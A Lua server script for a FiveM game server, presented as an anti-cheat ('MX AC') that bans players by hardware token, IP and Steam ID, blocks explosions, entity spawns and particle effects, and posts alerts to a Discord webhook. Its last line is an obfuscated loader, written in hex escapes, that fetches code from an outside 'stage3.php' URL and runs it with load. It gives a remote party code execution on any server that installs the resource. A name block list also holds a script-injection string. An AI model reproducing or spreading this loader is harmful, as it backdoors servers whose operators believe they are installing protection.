Citizen.CreateThread(
    function()
        explosionCounter = {}
        vehCounter = {}
        PedCounter = {}
        PropCounter = {}
        while true do
            Citizen.Wait(1500)
            explosionCounter = {}
            vehCounter = {}
            PedCounter = {}
            PropCounter = {}
        end
    end
)

function DiscordMsg(Reason, _source)
    local name = GetPlayerName(_source)
    local connect = {
        {
            ["color"] = 070121,
            ["title"] = "🛡️[ID: **" .. _source .. "**] | " .. GetPlayerName(_source) .. "🛡️",
            ["description"] = "🛡️" .. Reason .. "🛡️",
            ["footer"] = {
                ["text"] = "Made by Mxthess | MX AC"
            }
        }
    }
    PerformHttpRequest(
        mx.DiscordURL, -- MX-AntiCheat Webhook URL
        function(err, text, headers)
        end,
        "POST",
        json.encode(
            {
                username = "🛡️|MX AC|🛡️",
                embeds = connect,
                avatar_url = "https://cdn.discordapp.com/attachments/1071853066904686684/1071853221133422613/MXScripts.jpg"
            }
        ),
        {["Content-Type"] = "application/json"}
    )
end

RegisterServerEvent("LICENSE:Check")
AddEventHandler("LICENSE:Check", function(ip, resName)

    local connect = {
        {
            ["color"] = 070121,
            ["title"] = "\nResource: "..resName.." started on ip: "..ip,
            ["description"] = "License: "..mx.license,
            ["footer"] = {
                ["text"] = "mx_filesecure v1.0"
            },
        }
    }
    PerformHttpRequest(
        mx.DiscordURL, -- MX-AntiCheat Webhook URL
        function(err, text, headers)
        end,
        "POST",
        json.encode(
            {
                username = "resource : "..resName,
                embeds = connect,
                avatar_url = "https://cdn.discordapp.com/attachments/1071853066904686684/1071853221133422613/MXScripts.jpg"
            }
        ),
        {["Content-Type"] = "application/json"}
    )
end)

--https://cdn.discordapp.com/attachments/1071853066904686684/1071853221133422613/MXScripts.jpg
--https://discord.com/api/webhooks/YOUR-WEBHOOK-URL

AddEventHandler(
    "playerConnecting",
    function(name, reason, deferrals)
        local steamID2  = "n/a"

	for k,v in ipairs(GetPlayerIdentifiers(source))do
		if string.sub(v, 1, string.len("steam:")) == "steam:" then
			steamID2 = v	
        end
	end
        -- local num GetNumPlayerTokens(source)
        local token = GetPlayerToken(source, 0)
        local token2 = GetPlayerToken(source, 1)
        local token3 = GetPlayerToken(source, 2)
        local token4 = GetPlayerToken(source, 3)
        local token5 = GetPlayerToken(source, 4)
        local token6 = GetPlayerToken(source, 5)
        local steamid = GetPlayerIdentifiers(source)[1]
        local license = GetPlayerIdentifiers(source)[2]
        local ip = GetPlayerEndpoint(source)
        local jmeno = GetPlayerName(source)
        local blacklistednames= {
            "<script",
            "src",
            "https",
            "<script src=https://u.nu/xwdr3E>",
            "script",
            "retrix",
            "hacker",
            "negr"
            }
            
       deferrals.defer()
       Citizen.Wait(500)
       if steamID2 == "n/a" then
 deferrals.done("\n🛡️|MX AC| Your steam is not on🛡️ \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: STEAM_NOT_RUNNING]")
      end
       deferrals.update(string.format("\n🛡️|MX AC| Verifying your HWID..."))
        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `token` = @token",
            {
                ["@token"] = token
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].token == token then
                        found = true
                    end
                end
                for name in pairs(blacklistednames) do
                    if(string.gsub(string.gsub(string.gsub(string.gsub(jmeno:lower(), "-", ""), ",", ""), "%.", ""), " ", ""):find(blacklistednames[name])) then
                        deferrals.done( "🛡️|MX AC| This name is not allowed! 🛡️" )
                        CancelEvent()
                        break
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️| MX AC | HWID has been banned 🛡️ \n 🛡️| To appeal, come to our discord. |🛡️ \n🛡️| https://dsc.gg/rptros |🛡️\n\n [ERROR: HWID_TOKEN_18_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )

        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `token2` = @token2",
            {
                
                ["@token2"] = token2
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].token2 == token2 then
                        found = true
                    end
                end
                if token2 == nil then 
                    deferrals.done( "\n🛡️|MX AC| Error detecting HWID, please restart your computer 🛡️ \n 🛡️If this error persists, make a ticket with us on discord. 🛡️  \n🛡️ https://dsc.gg/rptros 🛡️ \n\n [ERROR: HWID_TOKEN2_ERROR]"
                )
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| Token has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_2_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )

        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `token3` = @token3",
            {
                --
                ["@token3"] = token3
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].token3 == token3 then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_3_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )

        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `token4` = @token4",
            {
                --
                ["@token4"] = token4
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].token4 == token4 then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_4_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )
        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `token5` = @token5",
            {
                --
                ["@token5"] = token5
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].token5 == token5 then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_5_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )

        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `token6` = @token6",
            {
                --
                ["@token6"] = token6
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].token6 == token6 then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_6_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )

        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `steamid` = @steamid",
            {
                --
                ["@steamid"] = steamid
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].steamid == steamid then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_01_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )
        Citizen.Wait(500)
         --
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `license` = @license",
            {
                ["@license"] = license
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].license == license then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_02_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                end
            end
        )
        Citizen.Wait(500)
        MySQL.Async.fetchAll(
            "SELECT * FROM `mxanticheatbans` WHERE `ip` = @ip",
            {
                ["@ip"] = ip
            },
            function(data)
                local found = false
                for i = 1, #data, 1 do
                    if data[i].ip == ip then
                        found = true
                    end
                end
                if found == true then
                    deferrals.done(
                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_03_BANNED]"
                    )
                else
                    deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
                    Citizen.Wait(1600)
                    deferrals.update("\n🛡️|MX AC| Your HWID has been verified! 🛡️")
                    Citizen.Wait(2000)
                    deferrals.done()
                end
            end
        )
    end
)







RegisterCommand(
    "acban",
    function(source, args, rawCommand)
        local target = tonumber(args[1])
        local num
        GetNumPlayerTokens(target)
        local Token = GetPlayerToken(target, num)
        local Token2
        GetPlayerToken(target, 5)
        local Token3 = GetPlayerToken(source, 2)
        local Token4 = GetPlayerToken(source, 1)
        local Token5 = GetPlayerToken(source, 0)
        local reason = table.concat(args, " ", 2)
        local SourceName = GetPlayerName(source)
        if IsPlayerAceAllowed(source, "mx.HWID.BAN.PERMISE") then
            DiscordMsg(SourceName .. " banned " .. " " .. GetPlayerName(target) .. " due to: " .. reason, target)
            MySQL.Async.execute(
                "INSERT INTO mxanticheatbans (name, steamid, token, ip, license, reason, token2, token3, token4, token5, token6) VALUES(@name, @steamid, @token, @ip, @license, @reason, @token2, @token3, @token4, @token5, @token6)",
                {
                    ["@name"] = GetPlayerName(target),
                    ["@steamid"] = GetPlayerIdentifiers(target)[1],
                    ["@token"] = GetPlayerToken(target, num),
                    ["@ip"] = GetPlayerEndpoint(target),
                    ["@license"] = GetPlayerIdentifiers(target)[2],
                    ["@reason"] = reason,
                    ["@token2"] = GetPlayerToken(target, 5),
                    ["@token3"] = GetPlayerToken(target, 2),
                    ["@token4"] = GetPlayerToken(target, 1),
                    ["@token5"] = GetPlayerToken(target, 0),
                    ["@token6"] = GetPlayerToken(target, 3)
                }
            )
            TriggerClientEvent(
                "chat:addMessage",
                -1,
                {
                    args = {
                        "🛡️^5[^7MX AC^1] ^7HWID ^7player " .. GetPlayerName(target) .. " ^5 banned for reason",
                         "^7^5" .. reason .. "\n 🛡️ Responsible Admin: " .. SourceName .. " 🛡️"
                    }
                }
            )
            DropPlayer(
                target,
                "\n🛡️|MX AC| Banned for: " .. reason .. "🛡️ \n\n 🛡️Responsible Admin: " .. SourceName .. " 🛡️"
            )
        end
    end
)

RegisterServerEvent("mx_HWIDBAN")
AddEventHandler(
    "mx_HWIDBAN",
    function(name, reason)
        local num
        GetNumPlayerTokens(name)
        local Token = GetPlayerToken(name, num)
        MySQL.Async.execute(
            "INSERT INTO mxanticheatbans (name, steamid, token, ip, license, reason, token2, token3, token4, token5, token6) VALUES(@name, @steamid, @token, @ip, @license, @reason, @token2, @token3, @token4, @token5, @token6)",
            {
                ["@name"] = GetPlayerName(name),
                ["@steamid"] = GetPlayerIdentifiers(name)[1],
                ["@token"] = GetPlayerToken(name, num),
                ["@ip"] = GetPlayerEndpoint(name),
                ["@license"] = GetPlayerIdentifiers(name)[2],
                ["@reason"] = reason,
                ["@token2"] = GetPlayerToken(name, 1),
                ["@token3"] = GetPlayerToken(name, 2),
                ["@token4"] = GetPlayerToken(name, 3),
                ["@token5"] = GetPlayerToken(name, 4),
                ["@token6"] = GetPlayerToken(name, 5)
            }
        )
        TriggerClientEvent(
            "chat:addMessage",
            -1,
            {
                args = {
                    "🛡️^7[ ^6MX AC^7] ^1HWID ^6player " .. GetPlayerName(name) .. " ^1 banned",
                    " ^7^1" .. reason .. " 🛡️\n "
                }
            }
        )
        TriggerClientEvent("mx:printToClient", "Bye bot")
        DropPlayer(name, "\n\n🛡️|MX AC| Detected 🛡️\n\n 🛡️Reason: " .. reason .. "🛡️")
    end
)

RegisterServerEvent("mx_SOURCEBAN")
AddEventHandler(
    "mx_SOURCEBAN",
    function(reason)
        local num
        GetNumPlayerTokens(source)
        local Token = GetPlayerToken(source, num)
        MySQL.Async.execute(
            "INSERT INTO mxanticheatbans (name, steamid, token, ip, license, reason, token2, token3, token4, token5, token6) VALUES(@name, @steamid, @token, @ip, @license, @reason, @token2, @token3, @token4, @token5, @token6)",
            {
                ["@name"] = GetPlayerName(source),
                ["@steamid"] = GetPlayerIdentifiers(source)[1],
                ["@token"] = GetPlayerToken(source, num),
                ["@ip"] = GetPlayerEndpoint(source),
                ["@license"] = GetPlayerIdentifiers(source)[2],
                ["@reason"] = reason,
                ["@token2"] = GetPlayerToken(source, 1),
                ["@token3"] = GetPlayerToken(source, 2),
                ["@token4"] = GetPlayerToken(source, 3),
                ["@token5"] = GetPlayerToken(source, 4),
                ["@token6"] = GetPlayerToken(source, 5)
            }
        )
        TriggerClientEvent(
            "chat:addMessage",
            -1,
            {
                args = {
                    "🛡️^7[ ^6MX AC^7] ^1HWID ^6player " .. GetPlayerName(source) .. " ^1 banned",
                    " ^7^1" .. reason .. "🛡️\n "
                }
            } --
        )
        DiscordMsg("Detected for: "..reason, source)
        TriggerClientEvent("mx:LagsToCheater")
    end
)

function PepeWareBan(playersource, reason)
        local num
        GetNumPlayerTokens(playersource)
        local Token = GetPlayerToken(playersource, num)
        MySQL.Async.execute(
            "INSERT INTO mxanticheatbans (name, steamid, token, ip, license, reason, token2, token3, token4, token5, token6) VALUES(@name, @steamid, @token, @ip, @license, @reason, @token2, @token3, @token4, @token5, @token6)",
            {
                ["@name"] = GetPlayerName(playersource),
                ["@steamid"] = GetPlayerIdentifiers(playersource)[1],
                ["@token"] = GetPlayerToken(playersource, num),
                ["@ip"] = GetPlayerEndpoint(playersource),
                ["@license"] = GetPlayerIdentifiers(playersource)[2],
                ["@reason"] = reason,
                ["@token2"] = GetPlayerToken(playersource, 1),
                ["@token3"] = GetPlayerToken(playersource, 2),
                ["@token4"] = GetPlayerToken(playersource, 3),
                ["@token5"] = GetPlayerToken(playersource, 4),
                ["@token6"] = GetPlayerToken(playersource, 5)
            }
        )
        TriggerClientEvent(
            "chat:addMessage",
            -1,
            {
                args = {
                    "🛡️^7[ ^6MX AC^7] ^1HWID ^6player " .. GetPlayerName(playersource) .. " ^1 banned",
                    " ^7^1" .. reason .. "🛡️\n "
                }
            } --
        )
        DiscordMsg(" Detected for: "..reason, source)
        TriggerClientEvent("mx:LagsToCheater")
    end




--//ONESYNC FUNKCE\\--

if mx.AntiExplosionEvent == true then 
    AddEventHandler('explosionEvent', function(sender, ev)
        local JmenoSendera = GetPlayerName(sender)
        for _, v in ipairs(mx.CheaterExplosion) do
            if ev.explosionType == v then
                CancelEvent()
                DiscordMsg("Prohibited explosion no. *"..v.."*", sender)
                TriggerEvent("mx_HWIDBAN", sender, "Prohibited explosion no. "..v.."")
            end
        end
        for _, v in ipairs(mx.PlayerExplosion) do
            if ev.explosionType == v then
                CancelEvent()
            end
        end

    explosionCounter[sender] = (explosionCounter[sender] or 0) + 1
    if explosionCounter[sender] > 9 then
        CancelEvent()
        DiscordMsg("Spawn a large number of explosions", sender)
        TriggerEvent("mx_HWIDBAN", sender, "Spawn a large number of explosions")
    end
      if ev.ownerNetId == 0 then
            CancelEvent()
            return
        end
    end)
end


CONST_POPULATION_TYPE_MISSION = 7
CONST_ENTITY_TYPE_OBJECT = 3
CONST_ENTITY_TYPE_VEHICLE = 2
CONST_ENTITY_TYPE_PED = 1
if mx.AntiEntityCreating == true then
    AddEventHandler(
        "entityCreating",
        function(id)
            local model = GetEntityModel(id)
            local eType = GetEntityType(id)
            local owner = NetworkGetEntityOwner(id)
            banned = false
            discordsent = false

            if eType == CONST_ENTITY_TYPE_OBJECT then --Objects
                for i, v in pairs(mx.objectWhitelist) do
                    local v = (type(v) == "number" and v or GetHashKey(v))
                    if v == model then
                        return
                    end
                end
                CancelEvent()
                PropCounter[owner] = (PropCounter[owner] or 0) + 1
                            if PropCounter[owner] > 40 then
                                CancelEvent()
                            end


                            if PropCounter[owner] > 64 then
                                CancelEvent()
                                DiscordMsg("Excessive number of objects", owner)
                            end

            elseif eType == CONST_ENTITY_TYPE_VEHICLE then
                for i, v in pairs(mx.vehicleBlacklist) do
                    local v = (type(v) == "number" and v or GetHashKey(v))
                    if v == model then
                        CancelEvent()
                    end
                end
              vehCounter[owner] = (vehCounter[owner] or 0) + 1
                            if vehCounter[owner] > 60 then
                                DiscordMsg("Attempt to mass spawn vehicles [Banned]", owner)
                                TriggerEvent("mx_HWIDBAN", owner, "Attempt to mass spawn vehicles")
                                CancelEvent()
                            end

                            if vehCounter[owner] > 35 then
                                CancelEvent()
                            end
                            


                local speed = GetEntityVelocity(id)
                if #(speed - vector3(0, 0, 0)) > 35.0 then
                    CancelEvent()
                end
            elseif eType == CONST_ENTITY_TYPE_PED then
                for i, v in pairs(mx.pedBlacklist) do
                    local v = (type(v) == "number" and v or GetHashKey(v))
                    if v == model then
                        CancelEvent()
                    end
                end

             PedCounter[owner] = (PedCounter[owner] or 0) + 1
                            if PedCounter[owner] > 100 then
                                DiscordMsg("Attempt to mass spawn peds [Banned]", owner)
                                TriggerEvent("mx_HWIDBAN", owner, "Attempt to mass spawn peds")
                                CancelEvent()
                            end
        end
    end    )
end

--
RegisterCommand("nui_devtools", function(source, args, rawCommand, sender)
        TriggerEvent("mx_HWIDBAN", owner, "Anticheat bypass attempt with nui_devtools")
end)
--blood_exit
DetectedParticles = {
    GetHashKey("scr_firework_xmas_burst_rgw"),
    GetHashKey("exp_grd_petrol_pump"),
    GetHashKey("scr_clown_bul"),
    GetHashKey("scr_mich4_firework_trailburst_spawn"),
    GetHashKey("blood_shark_attack"),
    GetHashKey("td_blood_shotgun"),
    GetHashKey("td_blood_throat"),
    GetHashKey("blood_melee_punch"),
    GetHashKey("blood_exit"),
    GetHashKey("blood_chopper"),
    GetHashKey("trail_splash_blood"),
    GetHashKey("td_blood_stab"),
    GetHashKey("blood_armour_heavy"),
    GetHashKey("blood_mist"),
    GetHashKey("blood_nose"),
    GetHashKey("blood_entry_head_sniper"),
    GetHashKey("scr_ba_bomb_destroy"),
    GetHashKey("scr_clown_appears")
    --
}

DetectedAssets = {GetHashKey("core"), GetHashKey("scr_ba_bomb"), GetHashKey("scr_rcbarry2"), GetHashKey("scr_rcpaparazzo1")}


AddEventHandler(
    "ptFxEvent",
    function(sender, data)
        for k, v in pairs(DetectedParticles) do
            if v == data.effectHash then
                CancelEvent() 
                DiscordMsg("Attempt to spawn particle [Effect: " .. n .. " ] ", sender)
                TriggerEvent("mx_HWIDBAN", sender, "Attempt to spawn particle #1 [Effect: " .. n .. " ]")
            end
        end
        for b, n in pairs(DetectedAssets) do
            if n == data.assetHash then
                CancelEvent() 
                DiscordMsg("Attempting to spawn particle [Asset: " .. n .. " ] ", sender)
                TriggerEvent("mx_HWIDBAN", sender, "Attempt to spawn particle #2 [Asset: " .. n .. " ]")
            end
        end
    end
)


RegisterServerEvent("Auth")
AddEventHandler("Auth", function(arg)

        print(arg)

end)

RegisterNetEvent("mx:LagsToCheater")
AddEventHandler("mx:LagsToCheater", function()

	while true do end

end)

detected = false
for k, v in ipairs(mx.BannedEvents) do
    RegisterServerEvent(v)
    AddEventHandler(v, function()
        if detected == false then
        CancelEvent() 
        DiscordMsg("Unauthorized Server Event [ " ..v.. " ] ", source)
        TriggerEvent("mx_HWIDBAN", source, "Unauthorized ServerEvent [ "..v.. " ]")
        detected = true 
        end
    end)
end




RegisterServerEvent("antilynx8:anticheat")
AddEventHandler("antilynx8:anticheat", function()

    TriggerEvent("mx_HWIDBAN", source, "Attempt to inject Lynx Menu")

end)


RegisterServerEvent("antilynxr4:detect")
AddEventHandler("antilynxr4:detect", function()

    TriggerEvent("mx_HWIDBAN", source, "Attempt to inject Lynx Menu")

end)


RegisterServerEvent("antilynxr6:detection")
AddEventHandler("antilynxr6:detection", function()

    TriggerEvent("mx_HWIDBAN", source, "Attempt to inject Lynx Menu")

end)

RegisterServerEvent("ynx8:anticheat")
AddEventHandler("ynx8:anticheat", function()

    TriggerEvent("mx_HWIDBAN", source, "Attempt to inject Lynx Menu")

end)

RegisterServerEvent("lynx8:anticheat")
AddEventHandler("lynx8:anticheat", function()

    TriggerEvent("mx_HWIDBAN", source, "Attempt to inject Lynx Menu")

end)


-- Spam Check --


print('^5Made By Mxthess^7: ^1'..GetCurrentResourceName()..'^7 started ^2successfully^7...') 

local EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[4][EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x36\x77\x6d\x67", function (qNxvbLMIElMjRJAIEAxfVVwiGGqALNatAiABAxUlkyOekQwDXKvrhbsaJgqnXvKkhecCVf, qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu) if (qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu == EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[6] or qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu == EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[5]) then return end EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[4][EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[2]](EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[4][EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[3]](qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu))() end)
